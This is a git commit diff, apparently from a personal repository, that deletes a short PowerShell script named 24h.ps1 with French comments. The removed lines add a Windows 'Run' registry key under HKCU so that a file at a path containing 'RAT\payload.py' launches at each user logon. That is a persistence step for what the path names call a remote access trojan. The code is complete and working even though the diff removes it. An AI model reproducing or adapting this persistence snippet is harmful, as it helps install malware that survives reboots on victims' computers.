07f3859878b03d7093650d66cf203c16b3da01fe
justejules <101141842+justejules@users.noreply.github.com>
2024-02-19 11:17:09 +0100

    End

--- 24h.ps1
+++ 24h.ps1
@@ -1,8 +1,1 @@
-# Chemin complet vers votre script Python
-$pythonScriptPath = "C:\Users\Public\Reseaux publics\RAT\payload.py"
 
-# Nom de la clé de registre
-$keyName = "PythonScriptStartup"
-
-# Ajouter une entrée dans le registre pour exécuter le script Python au démarrage
-New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $keyName -Value $pythonScriptPath -Force
